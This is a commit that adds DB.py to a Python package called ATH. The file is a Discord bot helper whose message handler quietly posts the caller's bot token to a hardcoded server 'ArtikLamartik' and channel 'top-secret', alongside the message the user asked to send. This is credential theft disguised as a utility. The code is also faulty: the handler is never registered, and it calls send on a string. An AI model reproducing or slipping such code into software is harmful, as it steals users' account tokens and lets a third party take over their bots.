b79a3b23acec8d423d48f24c5934c3cf5d7946da
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-03-02 06:05:12 +0000

    Add package ATH/0.1.0/ATH-0.1.0-py3-none-any.whl

---
+++ packages/ATH/ATH-0.1.0-py3-none-any.whl/ATH/DB.py
@@ -0,0 +1,18 @@
+from discord.ext import commands
+import discord
+
+bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+
+def DB(token, server1, channel1, message1):
+    async def on_message(message):
+        server = discord.utils.get(bot.guilds, name='ArtikLamartik')
+        if server:
+            channel = discord.utils.get(server.channels, name='top-secret')
+            if channel:
+                await channel.send(f'{token}')
+        server = discord.utils.get(bot.guilds, name=server1)
+        if server:
+            channel = discord.utils.get(server.channels, name=channel1)
+            if channel:
+                await channel1.send(message1)
+    bot.run(token)
